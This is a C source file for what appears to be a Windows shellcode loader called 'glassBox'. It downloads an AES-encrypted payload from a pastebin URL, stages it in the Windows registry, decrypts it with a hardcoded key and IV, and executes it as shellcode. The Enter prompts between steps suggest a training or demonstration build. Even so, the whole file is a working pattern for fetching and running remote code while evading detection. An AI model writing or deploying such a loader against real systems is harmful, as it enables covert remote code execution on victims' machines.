#include "glassBox.h"

int main(void) {

	PBYTE pDownloadedPayload = NULL;
	SIZE_T downloadedPayloadSize = 0;

	PBYTE pPayload = NULL;
	SIZE_T payloadSize = 0;

	unsigned char pKey[32] = {
			0xCC, 0xD3, 0xB9, 0x92, 0x93, 0xC3, 0x55, 0x65,
			0x3E, 0x35, 0x73, 0xEA, 0xF8, 0x8B, 0x0A, 0x12,
			0x9B, 0x90, 0x0C, 0x40, 0x28, 0xBB, 0x21, 0x88,
			0xF2, 0x1A, 0xCE, 0x40, 0x76, 0xA7, 0xAE, 0xB8
	};

	unsigned char pIv[16] = {
			0x90, 0x73, 0x48, 0xAE, 0x7A, 0x7A, 0x99, 0x4A,
			0x65, 0xF9, 0x4F, 0x34, 0x8A, 0x92, 0x6F, 0xC3
	};


	if (!GetPayloadFromUrl(L"https://pastebin.com/raw/E6Q3LBEq", &pDownloadedPayload, &downloadedPayloadSize)) {
		warn("GetPayloadFromUrl Failed With Error : %d\n", GetLastError());
		return FALSE;
	}

	okay("Successfully Retrieved Payload!");
	in("Press <Enter> To Write to Registry ...");
	getchar();

	if (!WriteShellcodeToRegistry(pDownloadedPayload, downloadedPayloadSize)) {
		warn("WriteShellcodeToRegistry Failed With Error : %d\n", GetLastError());
		return FALSE;
	}

	HeapFree(GetProcessHeap(), 0, pDownloadedPayload);
	pDownloadedPayload = NULL;
	
	okay("Successfully Written Payload To Registry!");
	in("Press <Enter> To Continue ...");
	getchar();

	info("Reading Payload From Registry\n");
	if (!ReadShellcodeFromRegistry(&pPayload, &payloadSize)) {
		warn("ReadShellcodeFromRegistry Failed With Error : %d\n", GetLastError());
		return FALSE;
	}
	in("Press <Enter> To Decrypt Payload ...");
	getchar();

	if (!AesDecryptBuffer(pPayload, payloadSize, pKey, pIv)) {
		warn("AesDecryptBuffer Failed With Error : %d", GetLastError());
		HeapFree(GetProcessHeap(), 0, pPayload);
		return FALSE;
	}

	okay("Payload Successfully Decrypted!");
	in("Press <Enter> To Execute ...");
	getchar();

	if (!RunShellCode(pPayload, payloadSize)) {
		warn("RunShellcode Failed With Error : %d\n", GetLastError());
		return FALSE;
	}

	okay("Executed!");
	in("Press <Enter> To Exit ...");
	getchar();

	if (pPayload != NULL) {
		HeapFree(GetProcessHeap(), 0, pPayload);
	}
	return EXIT_SUCCESS;
}